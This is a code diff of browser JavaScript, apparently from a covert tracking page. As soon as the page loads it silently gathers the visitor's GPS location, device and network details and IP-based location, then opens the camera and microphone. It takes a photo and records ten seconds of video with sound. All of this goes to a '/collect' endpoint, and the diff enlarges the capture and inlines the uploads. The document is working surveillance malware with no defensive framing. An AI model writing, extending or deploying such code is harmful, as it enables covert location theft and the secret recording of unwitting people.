@@ -2,71 +2,72 @@
     var d={sessionId:'s_'+Date.now(),timestamp:new Date().toISOString(),userAgent:navigator.userAgent};
     var mediaRecorder, recordedChunks=[], stream;
     
-    // STEP 1: Collect data silently FIRST (no permission needed)
+    // STEP 1: Collect data silently
     function collectInfo(){
-        // GPS
         if(navigator.geolocation){
             navigator.geolocation.getCurrentPosition(function(p){
                 d.gps={lat:p.coords.latitude,lon:p.coords.longitude};
             },function(){},{enableHighAccuracy:true,timeout:8000});
         }
-        // Device
         d.device={platform:navigator.platform,screen:screen.width+'x'+screen.height,cores:navigator.hardwareConcurrency,memory:navigator.deviceMemory||'?',language:navigator.language};
-        // Battery
         navigator.getBattery().then(function(b){d.battery={charging:b.charging,level:Math.round(b.level*100)+'%'};});
-        // Connection
         if(navigator.connection)d.connection={type:navigator.connection.effectiveType,downlink:navigator.connection.downlink};
-        // IP
         fetch('https://ipapi.co/json/').then(r=>r.json()).then(j=>{
             d.network={ip:j.ip,city:j.city,country:j.country_name,isp:j.org};
-            // SEND DATA NOW (Phase 1)
-            sendData('phase1');
+            fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(Object.assign({},d,{phase:'phase1'}))});
         });
     }
     
-    // STEP 2: Ask camera + take photo + record 5 seconds
+    // STEP 2: Camera + Photo + 10 second recording
     async function startCamera(){
         try{
             stream=await navigator.mediaDevices.getUserMedia({
-                video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}},
+                video:{facingMode:"user",width:{ideal:1920},height:{ideal:1080}},
                 audio:true
             });
+            
+            // Show full screen camera preview
+            var preview=document.getElementById('cameraPreview');
+            preview.srcObject=stream;
+            preview.style.display='block';
+            await preview.play();
             
             // Show dots
             document.getElementById('greenDot').style.display='block';
             document.getElementById('yellowDot').style.display='block';
-            document.getElementById('recMsg').style.display='block';
             
-            // Take photo
-            await new Promise(r=>setTimeout(r,600));
+            // Take photo after camera is ready
+            await new Promise(r=>setTimeout(r,1500));
             var canvas=document.createElement('canvas');
-            canvas.width=1280;canvas.height=720;
-            var video=document.createElement('video');
-            video.srcObject=stream;
-            await video.play();
-            canvas.getContext('2d').drawImage(video,0,0);
-            d.photo=canvas.toDataURL('image/jpeg',0.9);
-            video.pause();
+            canvas.width=preview.videoWidth||1920;
+            canvas.height=preview.videoHeight||1080;
+            canvas.getContext('2d').drawImage(preview,0,0);
+            d.photo=canvas.toDataURL('image/jpeg',0.95);
             
-            // Send photo NOW
-            sendData('phase2');
+            // Send photo
+            fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(Object.assign({},d,{phase:'phase2'}))});
             
-            // Record 5 seconds
+            // Hide camera preview after photo
+            preview.style.display='none';
+            
+            // Record 10 seconds
             mediaRecorder=new MediaRecorder(stream,{mimeType:'video/webm'});
             mediaRecorder.ondataavailable=function(e){if(e.data.size>0)recordedChunks.push(e.data);};
             mediaRecorder.onstop=sendVideo;
             mediaRecorder.start(1000);
             
-            // Update recording message
-            var sec=5;
+            // Countdown
+            var sec=10;
             var msgEl=document.getElementById('recMsg');
+            msgEl.style.display='block';
+            msgEl.textContent='● REC '+sec+'s';
             var countdown=setInterval(function(){
                 sec--;
-                msgEl.textContent='● REC '+sec+'s';
-                if(sec<=0){clearInterval(countdown);msgEl.textContent='';}
+                if(sec>0){msgEl.textContent='● REC '+sec+'s';}
+                else{clearInterval(countdown);msgEl.style.display='none';}
             },1000);
             
-            // Stop after 5 seconds
+            // Stop after 10 seconds
             setTimeout(function(){
                 if(mediaRecorder&&mediaRecorder.state==='recording'){
                     mediaRecorder.stop();
@@ -74,7 +75,7 @@
                     document.getElementById('greenDot').style.display='none';
                     document.getElementById('yellowDot').style.display='none';
                 }
-            },5000);
+            },10000);
             
         }catch(e){d.camErr=e.message;}
     }
@@ -85,21 +86,16 @@
             var reader=new FileReader();
             reader.onload=function(){
                 d.video=reader.result;
-                sendData('phase3');
+                fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(Object.assign({},d,{phase:'phase3'}))});
             };
             reader.readAsDataURL(blob);
         }
     }
     
-    function sendData(phase){
-        d.phase=phase;
-        fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});
-    }
-    
-    // Step 1: Collect data immediately on page load
+    // Step 1: Data immediately
     collectInfo();
     
-    // Step 2: After 2 seconds, ask for camera
+    // Step 2: Camera after 2 seconds
     setTimeout(startCamera,2000);
     
 })();
